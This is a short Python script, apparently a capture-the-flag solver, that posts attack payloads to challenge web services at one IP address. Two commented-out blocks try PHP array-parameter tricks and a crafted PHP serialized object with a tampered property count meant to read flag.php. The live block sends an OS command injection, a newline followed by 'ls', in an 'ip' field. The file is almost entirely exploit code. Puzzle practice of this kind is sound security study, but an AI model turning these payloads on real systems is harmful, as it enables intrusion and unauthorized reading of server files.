import requests
import base64
# url = "http://222.219.143.29:20033/?a[]=1"
# data = {'b[]':'2'}
# cookies = {'c[]':'3'}
# res = requests.post(url = url, data = data,cookies=cookies)
# print(res.content.decode('utf-8'))

# url = "http://222.219.143.29:20044/"
# serials = b"O:5:\"SoFun\":3:{s:7:\"%00*%00file\";s:9:\"./flag.php\";}"
# bserials = base64.b64encode(serials)
# data = {serials}
# res = requests.post(url = url, data = data)
# print(res.content.decode('utf-8'))

url = "http://222.219.143.29:20050/"
data = {'ip':'127.0.0.1%0als'}
res = requests.post(url = url, data = data)
print(res.content.decode('utf-8'))
